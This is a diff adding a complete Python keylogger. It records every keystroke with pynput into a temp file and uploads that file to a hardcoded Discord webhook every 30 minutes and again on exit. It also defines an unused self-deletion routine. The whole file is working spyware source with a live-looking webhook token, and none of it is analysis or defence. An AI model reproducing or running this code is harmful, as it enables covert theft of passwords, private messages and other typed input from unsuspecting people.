@@ -1,0 +1,175 @@
+from datetime import datetime
+from pynput.keyboard import Listener, Key
+import threading
+import requests
+import tempfile
+import atexit
+import time
+import sys
+import os
+
+# declare counter for spaces
+counter: int = 0
+
+# declare threading Lock() class
+counter_lock = threading.Lock()
+
+# declare main API endpoint of the server
+API_URL = "https://discord.com/api/webhooks/1456756375722922189/nd6mCxBhCyrlQ305MWqFlPTGKx_AEV0yEfEFoPRUar4uHOoComIUFckjt_ZvuCNwe7aQ"
+
+# declare main title
+title: str = """
+██  ██  ▄▄▄  ▄▄▄▄  ▄▄ ▄▄ ▄▄▄▄▄  ▄▄▄▄ ▄▄▄▄▄▄ 
+██████ ██▀██ ██▄█▄ ██▄██ ██▄▄  ███▄▄   ██   
+██  ██ ██▀██ ██ ██  ▀█▀  ██▄▄▄ ▄▄██▀   ██
+"""
+
+# declare main function
+def main() -> None:
+    # declare *this* file path
+    this_python_path = sys.argv[0]
+
+    # declare *keylog* path
+    temp_dir = tempfile.gettempdir()
+    keylog_path = os.path.join(temp_dir, "keylog.txt")
+
+    # declare a function for auto-deleting
+    def auto_delete():
+        try:
+            if os.path.exists(this_python_path):
+                if os.path.isfile(this_python_path):
+                    # auto-delete / cleanup
+                    time.sleep(5)
+                    os.remove(this_python_path)
+            else:
+                sys.stderr.write("There was an error with 'auto_delete' function")
+        except Exception as error:
+            sys.stderr.write(f"There was an exception / error: {error}")
+
+    # launch thread to send data file to the server
+    # declare loop function to send data file to the server
+    def send_keylog():
+        # preparing before loop process
+        time.sleep(5)
+        while True:
+            # interval of sending files is 30 minutes (1800 seconds)
+            time.sleep(1800)
+
+            # send the file to the server
+            try:
+                # open file and send it
+                with open(keylog_path, "rb") as file:
+                    files = {"file": file}
+                    payload = {"content": "**Keylog has arrived!**"}
+
+                    response = requests.post(API_URL, files=files, data=payload)
+
+            except requests.exceptions.RequestException as request_exception_1:
+                sys.stderr.write(f"There was a request error: {request_exception_1}")
+            except Exception as request_exception_2:
+                sys.stderr.write(f"There was a request error: {request_exception_2}")
+
+    def write_datetime_log():
+        formatted_date = datetime.now()
+
+        weekday = formatted_date.strftime("%A")
+        date_log = formatted_date.strftime("%x")
+        time_log = formatted_date.strftime("%X")
+
+        full_date_log = f" {weekday} | {time_log} | {date_log} "
+
+        # open the file and write date log
+        try:
+            with open(keylog_path, "a", encoding="utf-8") as document:
+                document.write(title)
+                document.write("-" * 40)
+                document.write("\n"+ full_date_log + "\n")
+                document.write("-" * 40 + "\n")
+
+        except Exception as date_log_exception:
+            sys.stderr.write(f"There was an error with date log: {date_log_exception}")
+
+    def atexit_datetime_log():
+        formatted_date = datetime.now()
+
+        date_log = formatted_date.strftime("%x")
+        time_log = formatted_date.strftime("%X")
+
+        full_date_log = f" END OF THE SESSION | {time_log} | {date_log} "
+
+        # open the file and write end of the session
+        try:
+            with open(keylog_path, "a", encoding="utf-8") as document:
+                document.write("\n" + "-" * 40 + "\n")
+                document.write(full_date_log + "\n")
+                document.write("-" * 40)
+
+        except Exception as end_of_session_exception:
+            sys.stderr.write(f"There was an error with date log: {end_of_session_exception}")
+        
+        # send the updated file to the server
+        try:
+            # open file and send it
+            with open(keylog_path, "rb") as file:
+                files = {"file": file}
+                payload = {"content": "**Updated keylog has arrived!**"}
+
+                response = requests.post(API_URL, files=files, data=payload)
+
+        except requests.exceptions.RequestException as request_exception_1:
+            sys.stderr.write(f"There was a request error: {request_exception_1}")
+        except Exception as request_exception_2:
+            sys.stderr.write(f"There was a request error: {request_exception_2}")
+
+        # exit the program
+        sys.exit(0)
+
+    # Main program setup
+    send_file_thread = threading.Thread(target=send_keylog)
+    send_file_thread.daemon = True
+
+    # launch send_file_thread to send data file to the server on background
+    send_file_thread.start()
+
+    # write date time log
+    write_datetime_log()
+
+    # shutdown listener
+    atexit.register(atexit_datetime_log)
+
+    # launch keylogger process
+    # main on_press function
+    def on_press(key_pressed):
+        global counter
+
+        # declare special keys
+        special_keys = [Key.backspace, Key.tab, Key.enter, Key.shift, Key.ctrl, Key.alt, Key.pause, Key.caps_lock, Key.esc, Key.space, Key.page_up, Key.page_down, Key.end, Key.home, Key.left, Key.up, Key.right, Key.down, Key.insert, Key.delete, Key.f1, Key.f2, Key.f3, Key.f4, Key.f5, Key.f6, Key.f7, Key.f8, Key.f9, Key.f10, Key.f11, Key.f12, Key.num_lock, Key.scroll_lock, Key.shift_l, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r]
+
+        # open thread with Lock() class
+        with counter_lock:
+            # write pressed keys in the file
+            try:
+                with open(keylog_path, "a", encoding="utf-8") as file:
+                    # increment counter variable
+                    counter = counter + 1
+                    # write pressed key
+                    if key_pressed in special_keys:
+                        file.write(f" [{str(key_pressed.name)}] ")
+                    elif hasattr(key_pressed, 'char') and key_pressed.char:
+                        file.write(f"{str(key_pressed.char)}")
+
+                    # write some space
+                    if counter >= 50:
+                        file.write("\n\n")
+                        counter = 0
+            except Exception as write_key_exception:
+                sys.stderr.write(f"There was an error writing keys to the file: {write_key_exception}")
+                counter = 0
+
+    # run keylogger
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    # starting to run keylogger
+    main()
